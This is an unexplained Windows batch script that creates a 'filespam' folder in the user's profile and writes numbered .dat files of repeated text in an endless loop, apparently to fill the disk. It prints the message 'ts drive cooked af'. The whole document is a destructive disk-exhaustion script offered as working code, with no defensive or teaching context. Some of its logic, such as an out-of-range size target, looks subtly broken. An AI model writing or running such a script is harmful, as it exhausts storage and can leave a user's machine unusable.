@echo off
setlocal EnableDelayedExpansion

set "TEXT=ETAetaETAetaETAetaETAetaETAetaETAetaETAetaETAetaETAetaETAetaETAetaETAetaETAetaETAetaETAeta"
set "TARGET=99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"
set "PREFIX=file"
set "OUTDIR=%USERPROFILE%\filespam"
set "CHUNKREPEAT=8192"

if not exist "%OUTDIR%" mkdir "%OUTDIR%"

set "chunk="
for /L %%i in (1,1,%CHUNKREPEAT%) do set "chunk=!chunk!!TEXT!^
"

set /a fileIndex=0
:nextFile
set "filename=%OUTDIR%\%PREFIX%!fileIndex!.dat"
break > "!filename!" 

echo ts drive cooked af

:writeLoop
for %%L in (!chunk!) do (
    set /a filesize=0
    for %%F in ("!filename!") do set /a filesize=%%~zF
    if !filesize! GEQ %TARGET% goto fileDone
    echo %%L>>"!filename!"
)
goto writeLoop

:fileDone
set /a fileIndex+=1
goto nextFile
